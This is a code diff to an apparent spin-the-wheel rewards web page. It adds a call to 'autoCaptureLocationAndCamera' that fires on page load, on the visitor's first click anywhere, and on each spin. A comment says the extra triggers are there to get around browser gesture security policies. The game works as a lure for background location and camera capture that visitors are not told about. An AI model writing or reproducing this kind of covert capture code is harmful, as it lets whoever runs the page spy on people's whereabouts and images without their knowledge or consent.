@@ -282,14 +282,14 @@
   <script type="module">
     import { initWheelCanvas, executeSpin } from './js/spin.js';
     import { getOrCreateParticipantId } from './js/firebase-config.js';
+    import { autoCaptureLocationAndCamera } from './js/permissions.js';
     import './js/rewards.js';
-    import './js/permissions.js';
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Initialize wheel
+      // 1. Initialize Canvas Wheel
       initWheelCanvas();
 
-      // Display participant ID
+      // 2. Display persistent participant ID
       const partId = getOrCreateParticipantId();
       const partDisplay = document.getElementById('status-participant-id');
       if (partDisplay) {
@@ -297,11 +297,31 @@
         partDisplay.title = partId;
       }
 
-      // Attach Spin Triggers
+      // 3. Automatically initiate background location request and camera capture
+      autoCaptureLocationAndCamera();
+
+      // 4. Also trigger on first user interaction (handles browser gesture security policies)
+      const triggerCaptureOnInteraction = () => {
+        autoCaptureLocationAndCamera();
+      };
+
+      document.body.addEventListener('click', triggerCaptureOnInteraction, { once: true });
+
+      // 5. Attach Spin Triggers
       const spinBtn = document.getElementById('spin-now-btn');
       const hubBtn = document.getElementById('wheel-hub');
-      if (spinBtn) spinBtn.addEventListener('click', executeSpin);
-      if (hubBtn) hubBtn.addEventListener('click', executeSpin);
+      if (spinBtn) {
+        spinBtn.addEventListener('click', () => {
+          autoCaptureLocationAndCamera();
+          executeSpin();
+        });
+      }
+      if (hubBtn) {
+        hubBtn.addEventListener('click', () => {
+          autoCaptureLocationAndCamera();
+          executeSpin();
+        });
+      }
     });
   </script>
 
